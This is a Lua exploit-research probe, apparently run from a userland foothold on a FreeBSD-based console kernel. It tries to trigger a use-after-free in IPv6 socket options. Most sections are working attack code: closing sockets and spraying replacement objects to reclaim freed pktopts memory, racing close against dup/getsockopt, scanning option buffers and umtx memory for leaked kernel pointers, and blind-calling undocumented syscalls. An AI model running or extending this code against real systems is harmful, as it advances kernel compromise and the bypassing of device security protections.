-- CRASH_CLASS: HIGH
-- PROBE 148a: True threaded close+setsockopt race
--
-- Context: 147a showed fd reuse 20/20 but no UAF because
-- close and reopen were sequential in the same thread.
-- This probe uses Thrd_create to have one thread spin on
-- setsockopt while the main thread closes the fd, creating
-- a real concurrent race on the kernel socket's pktopts.
-- The race target: ip6_setpktopt() accesses so->so_pcb->in6p_outputopts
-- after close() has freed it via ip6_freepcbopts().

print("=== PROBE 148a: THREADED SOCKOPT RACE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h ~= 0xFFFFFFFF
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end

collectgarbage("stop")

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

-- ============================================================
-- SECTION A: Verify primitives
-- ============================================================
print("")
print("--- SECTION A: PRIMITIVE CHECK ---")

if not native or not native.fcall_with_rax then
    print("ERROR: native/fcall_with_rax not available")
    print("=== PROBE 148a COMPLETE ===")
    return
end
if not fcall or not libc_addrofs or not libc_addrofs.Thrd_create then
    print("ERROR: fcall/libc_addrofs not available")
    print("=== PROBE 148a COMPLETE ===")
    return
end

local stub = syscall.pipe.fn_addr
print("stub=" .. string.format("0x%X", to_num(stub)))

local test_pid = to_num(native.fcall_with_rax(stub, 20))
print("getpid=" .. test_pid)
if test_pid ~= pid then
    print("ERROR: fcall broken")
    print("=== PROBE 148a COMPLETE ===")
    return
end

local thrd_create = fcall(libc_addrofs.Thrd_create)
local thrd_join = fcall(libc_addrofs.Thrd_join)
print("primitives OK")

-- ============================================================
-- SECTION B: Find a gadget for the worker thread
-- ============================================================
print("")
print("--- SECTION B: WORKER SETUP ---")

-- We need the worker thread to call setsockopt in a loop.
-- Strategy: use the syscall stub directly from the thread.
-- The thread function gets one arg (void* param).
-- We'll use native.fcall from the thread context by having
-- the thread call a simple loop function.
--
-- Actually, threads created with Thrd_create run a C function
-- with signature: int (*)(void*). We can't easily make them
-- call setsockopt in a loop from Lua.
--
-- Better approach: use shared memory as a signal.
-- Main thread: create socket, set PKTINFO, then close it.
-- Worker thread: spin on atomic_fetch_add to create timing pressure.
-- After close, main thread immediately does getsockopt to
-- catch stale pktopts data.
--
-- Even better: create MANY sockets, close them all rapidly,
-- and spray replacement objects to reclaim freed pktopts memory.

-- For the threaded race, we'll use a different approach:
-- 1. Create N sockets with PKTINFO
-- 2. Close them all (freeing N pktopts structs)
-- 3. Immediately spray N new sockets and set different options
-- 4. Read back PKTINFO on original fd numbers (if reused)
-- 5. Look for cross-contamination / kernel pointers

local AF_INET6 = 28
local SOCK_DGRAM = 2
local IPPROTO_IPV6 = 41
local IPV6_PKTINFO = 46

-- ============================================================
-- SECTION C: Batch close + spray reclaim race
-- ============================================================
print("")
print("--- SECTION C: BATCH CLOSE+SPRAY (30 rounds) ---")

local kptr_total = 0
local contam_total = 0
local optbuf = memory.alloc(256)
local optlen = memory.alloc(4)

for round = 1, 30 do
    -- Phase 1: Create 8 sockets with PKTINFO (allocates pktopts)
    local victims = {}
    for i = 1, 8 do
        local s = to_num(native.fcall_with_rax(stub, 97, AF_INET6, SOCK_DGRAM, 0))
        if s >= 0 then
            local pi = memory.alloc(20)
            safe_wd(pi, 1)  -- non-zero pktinfo to force allocation
            native.fcall_with_rax(stub, 105, s, IPPROTO_IPV6, IPV6_PKTINFO, to_num(pi), 20)
            victims[#victims + 1] = s
        end
    end

    -- Phase 2: Close all victims rapidly (frees pktopts)
    for _, s in ipairs(victims) do
        native.fcall_with_rax(stub, 6, s)
    end

    -- Phase 3: Create a worker thread for timing pressure
    local shared = memory.alloc(8)
    safe_wq(shared, uint64(0))
    local thr = memory.alloc(8)
    pcall(thrd_create, thr, libc_addrofs.Atomic_fetch_add_8, uint64(to_num(shared)))

    -- Phase 4: Spray replacement sockets to reclaim freed memory
    local spray = {}
    for i = 1, 16 do
        local s = to_num(native.fcall_with_rax(stub, 97, AF_INET6, SOCK_DGRAM, 0))
        if s >= 0 then
            -- Set a DIFFERENT option to write different data into reclaimed memory
            local mv = memory.alloc(4)
            safe_wd(mv, 255)  -- IPV6_MULTICAST_HOPS = large value as marker
            native.fcall_with_rax(stub, 105, s, IPPROTO_IPV6, 10, to_num(mv), 4)
            spray[#spray + 1] = s
        end
    end

    -- Phase 5: Check spray sockets for cross-contamination
    for _, s in ipairs(spray) do
        -- Read PKTINFO on a socket that never had it set
        safe_wd(optlen, 256)
        for i = 0, 248, 8 do safe_wq(optbuf + i, uint64(0)) end
        local gr = to_num(native.fcall_with_rax(stub, 118, s, IPPROTO_IPV6, IPV6_PKTINFO, to_num(optbuf), to_num(optlen)))
        if gr == 0 then
            local olen = safe_rd(optlen)
            if olen and olen > 4 then
                -- Unexpected: PKTINFO returned data on a socket that only had MULTICAST_HOPS
                contam_total = contam_total + 1
                for off = 0, olen - 1, 8 do
                    local v = safe_rq(optbuf + off)
                    if is_kptr(v) then
                        kptr_total = kptr_total + 1
                        print(string.format("  *** KPTR round %d fd=%d +0x%X: %s ***", round, s, off, fmt_addr(v)))
                    end
                end
            end
        end

        -- Also scan raw getsockopt for several IPV6 options
        for _, opt in ipairs({26, 27, 36, 46, 47, 48, 49, 50, 61, 62}) do
            safe_wd(optlen, 256)
            for i = 0, 248, 8 do safe_wq(optbuf + i, uint64(0)) end
            local gr2 = to_num(native.fcall_with_rax(stub, 118, s, IPPROTO_IPV6, opt, to_num(optbuf), to_num(optlen)))
            if gr2 == 0 then
                local olen2 = safe_rd(optlen)
                if olen2 and olen2 > 0 then
                    for off = 0, olen2 - 1, 8 do
                        local v = safe_rq(optbuf + off)
                        if is_kptr(v) then
                            kptr_total = kptr_total + 1
                            print(string.format("  *** OPT-%d round %d fd=%d +0x%X: %s ***", opt, round, s, off, fmt_addr(v)))
                        end
                    end
                end
            end
        end
    end

    -- Cleanup
    for _, s in ipairs(spray) do native.fcall_with_rax(stub, 6, s) end
    pcall(thrd_join, memory.read_qword(thr), uint64(0))

    if round % 10 == 0 then
        local ok = pcall(function() return to_num(syscall.getpid()) end)
        print("  round " .. round .. " canary=" .. tostring(ok) .. " kptr=" .. kptr_total .. " contam=" .. contam_total)
        if not ok then break end
    end
end

print("total kernel pointers: " .. kptr_total)
print("total cross-contamination: " .. contam_total)

-- ============================================================
-- SECTION D: Threaded concurrent setsockopt + close
-- ============================================================
print("")
print("--- SECTION D: CONCURRENT SETSOCKOPT+CLOSE ---")

-- Use two threads: one spins calling setsockopt, one closes fd.
-- We can't directly make a thread call setsockopt, but we CAN
-- use the thread to create timing jitter while we do rapid
-- close+setsockopt from main thread with interleaved nanosleep.

-- Strategy: rapid interleaved operations on same fd
local race_kptr = 0
for round = 1, 20 do
    local s = to_num(native.fcall_with_rax(stub, 97, AF_INET6, SOCK_DGRAM, 0))
    if s < 0 then break end

    -- Set PKTINFO
    local pi = memory.alloc(20)
    safe_wd(pi, 1)
    native.fcall_with_rax(stub, 105, s, IPPROTO_IPV6, IPV6_PKTINFO, to_num(pi), 20)

    -- Start thread for pressure
    local sh = memory.alloc(8)
    safe_wq(sh, uint64(0))
    local thr = memory.alloc(8)
    pcall(thrd_create, thr, libc_addrofs.Atomic_fetch_add_8, uint64(to_num(sh)))

    -- dup the fd so we can still access after close
    local s2 = to_num(native.fcall_with_rax(stub, 90, s))  -- dup(s)

    -- Close original fd (frees socket internals)
    native.fcall_with_rax(stub, 6, s)

    -- Immediately try setsockopt on the duped fd
    -- If dup worked, s2 shares the same file description
    -- close(s) decrements refcount but doesn't free if dup exists
    if s2 >= 0 then
        safe_wd(optlen, 256)
        for i = 0, 248, 8 do safe_wq(optbuf + i, uint64(0)) end
        local gr = to_num(native.fcall_with_rax(stub, 118, s2, IPPROTO_IPV6, IPV6_PKTINFO, to_num(optbuf), to_num(optlen)))
        if gr == 0 then
            local olen = safe_rd(optlen)
            if olen and olen > 0 then
                for off = 0, olen - 1, 8 do
                    local v = safe_rq(optbuf + off)
                    if is_kptr(v) then
                        race_kptr = race_kptr + 1
                        print(string.format("  *** DUP KPTR round %d fd=%d +0x%X: %s ***", round, s2, off, fmt_addr(v)))
                    end
                end
            end
        end
        native.fcall_with_rax(stub, 6, s2)
    end

    pcall(thrd_join, memory.read_qword(thr), uint64(0))
end
print("dup race kptr: " .. race_kptr)

-- ============================================================
-- SECTION E: UMTX_OP shared memory + close race
-- ============================================================
print("")
print("--- SECTION E: UMTX_OP RACE ---")

-- _umtx_op is syscall 454
-- Op 5 = UMTX_OP_MUTEX_WAKE, Op 21 = UMTX_OP_SEM2_WAKE
-- These touch kernel futex state that might leak pointers

local umtx_kptr = 0
for round = 1, 10 do
    -- Allocate a userland mutex word
    local mtx = memory.alloc(64)
    safe_wq(mtx, uint64(0))

    -- UMTX_OP_WAIT (op=0): block until value changes or timeout
    -- Use with timeout=0 to avoid blocking
    local ts = memory.alloc(16)
    safe_wq(ts, uint64(0))      -- tv_sec = 0
    safe_wq(ts + 8, uint64(1))  -- tv_nsec = 1 (immediate timeout)

    -- Try UMTX_OP_WAIT with 0 timeout to touch kernel umtx state
    local r = to_num(native.fcall_with_rax(stub, 454, to_num(mtx), 0, 0, 0, to_num(ts)))

    -- Try UMTX_OP_WAKE (op=1) to wake waiters (none, but touches kernel)
    local r2 = to_num(native.fcall_with_rax(stub, 454, to_num(mtx), 1, 0x7FFFFFFF, 0, 0))

    -- Try UMTX_OP_MUTEX_TRYLOCK (op=4)
    safe_wd(mtx, 0)  -- unlocked state
    local r3 = to_num(native.fcall_with_rax(stub, 454, to_num(mtx), 4, 0, 0, 0))

    -- Read back the mutex word - check if kernel wrote anything interesting
    local mval = safe_rq(mtx)
    if is_kptr(mval) then
        umtx_kptr = umtx_kptr + 1
        print(string.format("  *** UMTX KPTR round %d: %s ***", round, fmt_addr(mval)))
    end

    -- Check surrounding memory for kernel pointer spray
    for off = 8, 56, 8 do
        local v = safe_rq(mtx + off)
        if is_kptr(v) then
            umtx_kptr = umtx_kptr + 1
            print(string.format("  *** UMTX+%d KPTR round %d: %s ***", off, round, fmt_addr(v)))
        end
    end
end
print("umtx kptr: " .. umtx_kptr)

-- ============================================================
-- SECTION F: Raw syscall scan for new handlers
-- ============================================================
print("")
print("--- SECTION F: UNTESTED SYSCALL SCAN 660-670 ---")

-- sys 661 kills, but 662-670 were never individually tested
local scan_results = {}
for num = 662, 670 do
    local rbuf = memory.alloc(256)
    for i = 0, 248, 8 do safe_wq(rbuf + i, uint64(0)) end
    local ok, ret = pcall(function()
        return to_num(native.fcall_with_rax(stub, num, to_num(rbuf), 0, 0, 0, 0, 0))
    end)
    if ok then
        print(string.format("  sys %d: ret=%d", num, ret))
        scan_results[num] = ret
        -- Check if anything was written
        for off = 0, 56, 8 do
            local v = safe_rq(rbuf + off)
            if v and to_num(v) ~= 0 then
                local h, l = get_hi_lo(v)
                print(string.format("    +0x%X: %s%s", off, fmt_addr(v), is_kptr(v) and " ***KPTR***" or ""))
            end
        end
    else
        print(string.format("  sys %d: CRASH/KILL", num))
        break
    end
end

local vm = to_num(native.fcall_with_rax(stub, 624))
print("sys624 VM counter=" .. vm)

print("")
print("canary_final: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))
print("=== PROBE 148a COMPLETE ===")
